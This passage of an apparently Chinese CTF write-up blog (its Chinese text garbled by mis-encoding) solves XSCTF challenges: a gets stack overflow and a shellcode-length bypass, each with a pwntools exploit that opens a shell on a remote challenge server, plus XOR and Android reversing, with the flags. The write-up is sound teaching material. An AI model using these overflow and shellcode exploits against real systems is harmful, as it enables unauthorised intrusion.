**envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> RandomMove; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> userout; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v3 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402080);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020A0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020E6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402108);</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt;= <span class="number">9</span> &amp;&amp; v9 &lt;= <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_402139);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">5</span> )</span><br><span class="line">      gets(v5);</span><br><span class="line">    __isoc99_scanf(&amp;unk_402151, v5);</span><br><span class="line">    userout = stringToMove(v5);</span><br><span class="line">    <span class="keyword">if</span> ( userout == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402158);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v10 &gt; <span class="number">8</span> || v10 &lt;= <span class="number">5</span> || (<span class="keyword">int</span>)hard() &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">9</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hell() != <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">        win(userout, v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        RandomMove = getRandomMove();</span><br><span class="line">        <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">        <span class="keyword">if</span> ( RandomMove == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402037);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( RandomMove &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( RandomMove )</span><br><span class="line">            <span class="built_in">puts</span>(&amp;byte_40203E);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(&amp;s2);</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = determineWinner(userout, RandomMove);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_4021A7);</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402054);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402073);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(&amp;byte_402061, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10);</span><br><span class="line">        ++v9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)hard() &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      bewin(userout, v10);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­finalå‡½æ•°å°±æ˜¯æœ€ç»ˆçš„shellï¼Œè€Œgetså‡½æ•°å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨æ ˆæº¢å‡ºå°†å½“å‰å‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºfinalå‡½æ•°çš„è¿”å›åœ°å€<br>ä½†æ˜¯ä¼ è¾“çš„payloadéœ€è¦ç¬¦åˆä¸€å®šæ¡ä»¶<br>å› ä¸ºç¨‹åºå¯¹è¾“å…¥è¿›è¡Œäº†æ£€æŸ¥ï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»æ˜¯çŸ³å¤´å‰ªåˆ€å¸ƒçš„ä¸€ç§<br>è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç”¨%00ä½œä¸ºpayloadï¼Œå³è¾“å…¥çŸ³å¤´çš„ç¼–ç ååŠ ä¸Š%00ï¼Œè¿™æ ·ç¨‹åºåœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶é‡åˆ°%00å°±ä¼šè®¤ä¸ºå·²ç»åˆ°å­—ç¬¦ä¸²æœ«å°¾äº†ï¼Œè€Œå®é™…çš„payloadä¼šå…¨éƒ¨ä¼ è¾“åˆ°å†…å­˜ä¸­</p><blockquote><p>ä¸­æ–‡åœ¨Cè¯­è¨€ä¸­ä½¿ç”¨utf-8ç¼–ç ï¼Œä¸€ä¸ªä¸­æ–‡å­—ç¬¦å ç”¨ä¸‰ä¸ªå­—èŠ‚<br>åœ¨æ„é€ payloadæ—¶è¦æ³¨æ„ç«¯åºï¼Œä¾‹å¦‚â€œçŸ³å¤´â€çš„utf-8ç¼–ç æ˜¯<code>E79FB3E5A4B4</code>ä½†æ˜¯å®é™…ä¼ è¾“æ—¶æ˜¯<code>p64(0xe5b39fe7)+p64(0xb4a4)</code></p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rock_paper_scissors&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.213&#x27;</span>, <span class="number">30480</span>)</span><br><span class="line"><span class="comment"># print(list(p64(0xe5b39fe7)+p64(0xb4a4)))</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0xe5b39fe7</span>)+p64(<span class="number">0xb4a4</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x4012db</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;1bab71b8-117f-4dea-a047-340b72101d7b&#125;</code></p><h2 id="toolong"><a href="#toolong" class="headerlink" title="toolong"></a>toolong</h2><p><code>ä¸€ä¸ªå­—èŠ‚èƒ½è§£å†³çš„shellcodeï¼Œå°±ä¸è¦ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼</code></p><p>ç¨‹åºä¸¤æ¬¡æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œå…¶ä¸­ç¬¬äºŒæ¬¡åº”è¯¥è¾“å…¥shellcodeï¼Œä¹‹åç¨‹åºä¼šå°†ç”¨æˆ·è¾“å…¥çš„shellcodeç›´æ¥æ‰§è¡Œï¼Œä½†æ˜¯é¢˜ç›®é™åˆ¶äº†è¾“å…¥shellcodeçš„é•¿åº¦ï¼ˆ24ï¼‰</p><p>é¢˜ç›®ç»™çš„å¯æ‰§è¡Œæ–‡ä»¶åæ±‡ç¼–å¤±è´¥ï¼Œä¼°è®¡æ˜¯å°†å­—ç¬¦ä¸²åœ°å€ä½œä¸ºå‡½æ•°åœ°å€ç›´æ¥è°ƒç”¨å¯¼è‡´çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">.text:000055A4CE79820E ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:000055A4CE79820E public main</span><br><span class="line">.text:000055A4CE79820E main proc near                          ; DATA XREF: _start+18â†‘o</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E s&#x3D; byte ptr -150h</span><br><span class="line">.text:000055A4CE79820E buf&#x3D; byte ptr -50h</span><br><span class="line">.text:000055A4CE79820E var_8&#x3D; dword ptr -8</span><br><span class="line">.text:000055A4CE79820E var_4&#x3D; dword ptr -4</span><br><span class="line">.text:000055A4CE79820E</span><br><span class="line">.text:000055A4CE79820E ; __unwind &#123; &#x2F;&#x2F; 55A4CE797000</span><br><span class="line">.text:000055A4CE79820E endbr64</span><br><span class="line">.text:000055A4CE798212 push    rbp</span><br><span class="line">.text:000055A4CE798213 mov     rbp, rsp</span><br><span class="line">.text:000055A4CE798216 sub     rsp, 150h</span><br><span class="line">.text:000055A4CE79821D mov     eax, 0</span><br><span class="line">.text:000055A4CE798222 call    init</span><br><span class="line">.text:000055A4CE798227 mov     [rbp+var_8], 1</span><br><span class="line">.text:000055A4CE79822E lea     rax, s                          ; &quot;Welcome to XSCTF&quot;</span><br><span class="line">.text:000055A4CE798235 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798238 call    _puts</span><br><span class="line">.text:000055A4CE79823D lea     rax, [rbp+buf]</span><br><span class="line">.text:000055A4CE798241 mov     edx, 81                         ; nbytes</span><br><span class="line">.text:000055A4CE798246 mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798249 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE79824E call    _read</span><br><span class="line">.text:000055A4CE798253 lea     rax, aInputYourMagic            ; &quot;input your magic code:&quot;</span><br><span class="line">.text:000055A4CE79825A mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE79825D call    _puts</span><br><span class="line">.text:000055A4CE798262 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798269 mov     edx, 256                        ; nbytes</span><br><span class="line">.text:000055A4CE79826E mov     rsi, rax                        ; buf</span><br><span class="line">.text:000055A4CE798271 mov     edi, 0                          ; fd</span><br><span class="line">.text:000055A4CE798276 call    _read</span><br><span class="line">.text:000055A4CE79827B mov     [rbp+var_4], eax</span><br><span class="line">.text:000055A4CE79827E cmp     [rbp+var_4], 0</span><br><span class="line">.text:000055A4CE798282 jg      short loc_55A4CE79828B</span><br><span class="line">.text:000055A4CE798284 mov     eax, 0</span><br><span class="line">.text:000055A4CE798289 jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE79828B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE79828B</span><br><span class="line">.text:000055A4CE79828B loc_55A4CE79828B:                       ; CODE XREF: main+74â†‘j</span><br><span class="line">.text:000055A4CE79828B lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE798292 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE798295 call    _strlen</span><br><span class="line">.text:000055A4CE79829A mov     edx, [rbp+var_8]</span><br><span class="line">.text:000055A4CE79829D movsxd  rdx, edx</span><br><span class="line">.text:000055A4CE7982A0 cmp     rax, rdx</span><br><span class="line">.text:000055A4CE7982A3 ja      short loc_55A4CE7982BA</span><br><span class="line">.text:000055A4CE7982A5 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982AC mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982AF call    _strlen</span><br><span class="line">.text:000055A4CE7982B4 cmp     rax, 24</span><br><span class="line">.text:000055A4CE7982B8 jbe     short loc_55A4CE7982D0</span><br><span class="line">.text:000055A4CE7982BA</span><br><span class="line">.text:000055A4CE7982BA loc_55A4CE7982BA:                       ; CODE XREF: main+95â†‘j</span><br><span class="line">.text:000055A4CE7982BA lea     rax, aTooLong                   ; &quot;too long!&quot;</span><br><span class="line">.text:000055A4CE7982C1 mov     rdi, rax                        ; s</span><br><span class="line">.text:000055A4CE7982C4 call    _puts</span><br><span class="line">.text:000055A4CE7982C9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982CE jmp     short locret_55A4CE7982DE</span><br><span class="line">.text:000055A4CE7982D0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000055A4CE7982D0</span><br><span class="line">.text:000055A4CE7982D0 loc_55A4CE7982D0:                       ; CODE XREF: main+AAâ†‘j</span><br><span class="line">.text:000055A4CE7982D0 lea     rax, [rbp+s]</span><br><span class="line">.text:000055A4CE7982D7 call    rax</span><br><span class="line">.text:000055A4CE7982D9 mov     eax, 0</span><br><span class="line">.text:000055A4CE7982DE</span><br><span class="line">.text:000055A4CE7982DE locret_55A4CE7982DE:                    ; CODE XREF: main+7Bâ†‘j</span><br><span class="line">.text:000055A4CE7982DE                                         ; main+C0â†‘j</span><br><span class="line">.text:000055A4CE7982DE leave</span><br><span class="line">.text:000055A4CE7982DF retn</span><br><span class="line">.text:000055A4CE7982DF ; &#125; &#x2F;&#x2F; starts at 55A4CE79820E</span><br><span class="line">.text:000055A4CE7982DF main endp</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ç¨‹åºæ¥æ”¶äº†ä¸¤æ¬¡ç”¨æˆ·è¾“å…¥<br>è€Œåœ¨æ¥æ”¶äº†ä¸¤æ¬¡è¾“å…¥ä¹‹åç¨‹åºä¼šå¯¹è¾“å…¥è¿›è¡Œä¸¤æ¬¡æ£€æŸ¥</p><ol><li>åœ¨è°ƒç”¨readå‡½æ•°ä¹‹åï¼Œç¨‹åºä½¿ç”¨strlenå‡½æ•°å°†è¾“å…¥çš„é•¿åº¦å­˜å‚¨åœ¨raxä¸­ï¼Œæ¥ç€ç¨‹åºä¼šå°†raxä¸æ ˆä¸Šçš„ä¸€ä¸ªå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœraxå¤§äºè¯¥å€¼å°±ä¸ä¼šæ‰§è¡Œshellcode</li><li>ç¬¬äºŒæ¬¡æ˜¯ä¸ä¸€ä¸ªå›ºå®šå€¼ï¼ˆ24ï¼‰æ¯”è¾ƒï¼Œå¦‚æœå¤§äºè¿™ä¸ªå€¼å°±ä¸ä¼šæ‰§è¡Œshellcode</li></ol><p>å…¶ä¸­ç¬¬ä¸€æ¬¡æ ˆä¸Šçš„å€¼å…¶å®å¯ä»¥é€šè¿‡ç¬¬ä¸€æ¬¡çš„è¾“å…¥ä¿®æ”¹ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡è¿™æ¬¡æ¯”è¾ƒ<br>è€Œç¬¬äºŒæ¬¡çš„æ¯”è¾ƒéœ€è¦åœ¨å†™å…¥çš„payloadä¸­ä½¿ç”¨%00ä½œä¸ºåˆ†éš”ç¬¦ï¼Œåˆ†å¼€æ­£å¸¸è¾“å…¥å’Œshellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./toolong&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30510</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;z&#x27;</span>*<span class="number">80</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(p64(<span class="number">0x1234</span>)+shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;qy_7t11_y0u_th4t_y0ur_p4yl0ad_15_to0_lon9&#125;</code></p><h2 id="Lets-go-to-xor"><a href="#Lets-go-to-xor" class="headerlink" title="Lets_go_to_xor"></a>Lets_go_to_xor</h2><p><code>åªæ˜¯ä¸€ä¸ªè¶…çº§Eazzzzzzzzzzyçš„Goç¨‹åº,Let&#39;s Go!</code></p><p>ä½¿ç”¨golangç¼–å†™ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶<br><strong>å…¶ä¸»å‡½æ•°åœ¨<code>main.main</code>ä¸­</strong></p><p>è¿›å…¥<code>main.main</code>æ‰¾åˆ°<code>main.decode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main_decode@&lt;rax&gt;()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+12h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v1 != qword_C86F18 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)((__int64)i % <span class="number">10</span>) &gt;= <span class="number">0xA</span> )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v1 )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( qword_C86F18 &lt;= i )</span><br><span class="line">      runtime_panicIndex();</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶å’ŒCè¯­è¨€ä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥å‹‰å¼ºçœ‹å‡ºæ¥é€»è¾‘ï¼Œå¤§æ¦‚å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ„æ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0L</span>L; (__int64)v1 &gt; (__int64)i; ++i )</span><br><span class="line">    *(_BYTE *)(v0 + i) = aIL0veCtf[(__int64)i % <span class="number">10</span>] ^ *(_BYTE *)(i + v0);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)main_enc + i) != *(_BYTE *)(i + v0) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>main_enc</code>å’Œ<code>aIL0veCtf</code>ï¼Œæå–æ•°æ®ï¼Œå°†<code>main_enc</code>ä¸<code>aIL0veCtf</code>å¾ªç¯å¼‚æˆ–å°±å¯ä»¥å¾—åˆ°flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;i_l0ve_CtF&#x27;</span></span><br><span class="line">s = [<span class="number">0x0F</span>, <span class="number">0x33</span>, <span class="number">0x0D</span>, <span class="number">0x57</span>, <span class="number">0x0D</span>, <span class="number">0x3D</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x21</span>, <span class="number">0x17</span>, <span class="number">0x33</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x3A</span>, <span class="number">0x0F</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x24</span>, <span class="number">0x6B</span>, <span class="number">0x1F</span>, <span class="number">0x64</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    print(<span class="built_in">chr</span>((s[i]^<span class="built_in">ord</span>(key[i%<span class="number">10</span>]))&amp;<span class="number">0xff</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;XSWLHHH_1s_Pwn_M4sTer&#125;</code></p><h2 id="loglistening"><a href="#loglistening" class="headerlink" title="loglistening"></a>loglistening</h2><p>é¢˜ç›®ä¸‹å‘ä¸€ä¸ªå®‰è£…åŒ…<br>jadxæ‰“å¼€çœ‹åˆ°å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.loglistening;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.View.OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> com.example.loglistening.databinding.ActivityMainBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ActivityMainBinding binding;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">fasheng</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;loglistening&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="keyword">this</span>.binding = inflate;</span><br><span class="line">        setContentView((View) inflate.getRoot());</span><br><span class="line">        ((Button) findViewById(C0587R.C0590id.button1)).setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;å¥½åƒæœ‰ä»€ä¹ˆäº‹æƒ…åœ¨nativeå±‚å‘ç”Ÿäº†!&quot;</span>);</span><br><span class="line">                MainActivity.<span class="keyword">this</span>.fasheng();</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>.getApplicationContext(), <span class="string">&quot;flagå·²ç»ç”Ÿæˆäº†ï¼&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯é€šè¿‡nativeå±‚çš„ä»£ç ç”Ÿæˆçš„flag<br>æ‰¾åˆ°soæ–‡ä»¶æ‰”è¿›idaï¼Œæ‰¾åˆ°flagçš„ç”Ÿæˆä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Java_com_example_loglistening_MainActivity_fasheng</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  md5(<span class="string">&quot;stardustduststar&quot;</span>, v1);</span><br><span class="line">  __android_log_print(<span 